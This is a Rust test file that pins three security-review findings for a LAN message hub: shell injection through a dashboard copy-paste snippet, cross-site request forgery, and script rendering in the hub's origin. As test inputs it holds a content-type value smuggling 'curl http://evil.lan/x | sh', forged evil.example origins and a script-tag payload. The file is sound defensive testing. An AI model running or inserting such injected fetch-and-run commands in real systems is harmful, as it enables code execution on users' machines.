//! [Phase 7] The security review's findings, each pinned by a test that
//! fails against the code as it was.
//!
//! All three come from the same root: a payload or its metadata is
//! attacker-controlled (any LAN device may publish), and it later reaches
//! somewhere that treats it as trusted — a clipboard, a browser origin, or
//! a state-changing request.

use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;

use mailbox::engine::Engine;
use mailbox::engine::clock::{Clock, SystemClock};
use mailbox::http::{AppState, Limits, router};
use mailbox::store::Store;
use mailbox::sweeper::Heartbeat;

struct Hub {
    addr: SocketAddr,
}

impl Hub {
    fn url(&self, path: &str) -> String {
        format!("http://{}{path}", self.addr)
    }
}

async fn spawn() -> (Hub, tempfile::TempDir) {
    let dir = tempfile::tempdir().expect("a temp dir");
    let store = Arc::new(Store::open(dir.path()).expect("a store"));
    let engine = Arc::new(Engine::new(store, Arc::new(SystemClock)));
    let state = AppState::new(
        engine,
        Limits {
            max_body_bytes: 65_536,
            default_wait_s: 1,
            max_wait_s: 300,
            recheck_interval: Duration::from_millis(100),
        },
        Heartbeat::starting_at(SystemClock.now_ms()),
    );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("a port");
    let addr = listener.local_addr().expect("an address");
    tokio::spawn(async move {
        let _ = axum::serve(listener, router(state)).await;
    });
    (Hub { addr }, dir)
}

async fn publish_with_type(hub: &Hub, topic: &str, content_type: &str, body: &str) -> u16 {
    reqwest::Client::new()
        .post(hub.url(&format!("/t/{topic}")))
        .header("content-type", content_type)
        .body(body.to_string())
        .send()
        .await
        .expect("a response")
        .status()
        .as_u16()
}

// ─── Finding 1 · command injection through the copy-paste snippet ───────────

#[tokio::test]
async fn p7_sec1_a_hostile_content_type_cannot_escape_the_dashboard_snippet() {
    let (hub, _dir) = spawn().await;

    // A content type is attacker-controlled: any LAN device may publish, and
    // the header is stored verbatim (AR2). The dashboard then prints it
    // inside a shell command the operator is invited to paste — so a quote
    // that closes the string is code execution on their workstation.
    let hostile = "application/json' ; curl http://evil.lan/x | sh ; echo '";
    assert_eq!(
        publish_with_type(&hub, "notify.kenny", hostile, r#"{"n":1}"#).await,
        201,
        "the publish itself is allowed — mailbox stores what it is given"
    );

    let page = reqwest::get(hub.url("/t/notify.kenny/dashboard"))
        .await
        .expect("a response")
        .text()
        .await
        .expect("a body");

    // Read the page the way a browser shows it, which is what gets copied.
    let rendered = page
        .replace("&#x2f;", "/")
        .replace("&#x27;", "'")
        .replace("&quot;", "\"")
        .replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">");

    // Scope this to the shell snippet. The content type also appears in the
    // recent-messages table, where it is data on a page and harmless; the
    // snippet is the only place it becomes a command.
    let snippet = rendered
        .lines()
        .find(|line| line.contains("curl -s -H 'content-type:"))
        .unwrap_or_else(|| panic!("the publish snippet must be on the page:\n{rendered}"));

    assert!(
        !snippet.contains("evil.lan"),
        "an injection reached the clipboard — HTML escaping protects the \
         browser, not the paste buffer:\n{snippet}"
    );
    assert!(
        snippet.contains("content-type: application/json"),
        "and the snippet still shows a usable content type: {snippet}"
    );
}

// ─── Finding 2 · CSRF on state-changing requests ────────────────────────────

#[tokio::test]
async fn p7_sec2_a_cross_origin_browser_post_is_refused() {
    let (hub, _dir) = spawn().await;
    publish_with_type(&hub, "notify.kenny", "application/json", "{}").await;

    // The drive-by: the admin visits a hostile page while on the LAN, and it
    // posts a form at the hub. No auth means nothing else stops it.
    let response = reqwest::Client::new()
        .post(hub.url("/t/notify.kenny/dashboard/publish"))
        .header("content-type", "application/x-www-form-urlencoded")
        .header("origin", "http://evil.example")
        .body("payload=%7B%22from%22%3A%22attacker%22%7D")
        .send()
        .await
        .expect("a response");

    assert_eq!(
        response.status(),
        403,
        "a browser that announces a foreign origin must be refused"
    );

    // The API is not spared either: a form-encoded cross-origin publish is a
    // "simple request" and needs no preflight.
    let api = reqwest::Client::new()
        .post(hub.url("/t/notify.kenny"))
        .header("content-type", "text/plain")
        .header("origin", "http://evil.example")
        .body("{}")
        .send()
        .await
        .expect("a response");
    assert_eq!(api.status(), 403, "the same holds for the publish endpoint");
}

#[tokio::test]
async fn p7_sec2_scripts_and_same_origin_pages_are_unaffected() {
    let (hub, _dir) = spawn().await;

    // curl and every other non-browser client send no Origin at all. They
    // must keep working exactly as before — this is the whole API.
    assert_eq!(
        publish_with_type(&hub, "notify.kenny", "application/json", "{}").await,
        201,
        "a script with no Origin header is not a browser and is not blocked"
    );

    // The dashboard's own forms post from the hub's own origin.
    let same_origin = format!("http://{}", hub.addr);
    let response = reqwest::Client::new()
        .post(hub.url("/t/notify.kenny/dashboard/publish"))
        .header("content-type", "application/x-www-form-urlencoded")
        .header("origin", &same_origin)
        .body("payload=%7B%22ok%22%3Atrue%7D")
        .send()
        .await
        .expect("a response");
    assert!(
        response.status().is_success() || response.status().is_redirection(),
        "the dashboard's own form must still work: {}",
        response.status()
    );
}

// ─── Finding 3 · a payload rendering itself in the hub's origin ─────────────

#[tokio::test]
async fn p7_sec3_a_payload_cannot_render_itself_in_the_hubs_origin() {
    let (hub, _dir) = spawn().await;
    publish_with_type(&hub, "notify.kenny", "application/json", "{}").await;
    let _ = reqwest::get(hub.url("/t/notify.kenny/next?as=probe&wait=0")).await;

    // Published as HTML, this would otherwise execute in the hub's own origin
    // for anyone who opens the receive URL — including an iframe on a hostile
    // page.
    publish_with_type(
        &hub,
        "notify.kenny",
        "text/html",
        "<script>alert('pwned')</script>",
    )
    .await;

    let response = reqwest::get(hub.url("/t/notify.kenny/next?as=probe&wait=0"))
        .await
        .expect("a response");
    assert_eq!(response.status(), 200);

    let disposition = response
        .headers()
        .get("content-disposition")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_string();
    let nosniff = response
        .headers()
        .get("x-content-type-options")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_string();
    let content_type = response
        .headers()
        .get("content-type")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_string();

    assert!(
        disposition.contains("attachment"),
        "the raw body must be handed over as a download, never rendered in \
         the hub's origin"
    );
    assert_eq!(nosniff, "nosniff", "and never sniffed into something worse");
    assert_eq!(
        content_type, "text/html",
        "while AR2's promise holds: the stored content type is still reported"
    );
    assert_eq!(
        response.text().await.expect("a body"),
        "<script>alert('pwned')</script>",
        "and the bytes are still returned verbatim"
    );
}
